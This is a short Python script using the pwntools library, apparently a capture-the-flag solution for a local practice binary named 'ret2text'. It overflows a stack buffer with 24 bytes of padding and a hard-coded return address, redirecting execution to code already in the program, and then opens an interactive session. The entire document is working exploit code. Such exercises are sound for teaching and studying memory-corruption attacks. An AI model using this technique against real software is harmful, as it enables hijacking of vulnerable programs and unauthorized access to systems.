from pwn import*
o = process("./ret2text")
payload = b'a'*24 +p64(0x00000000004005d6)
pause()
o.sendline(payload)
o.interactive()
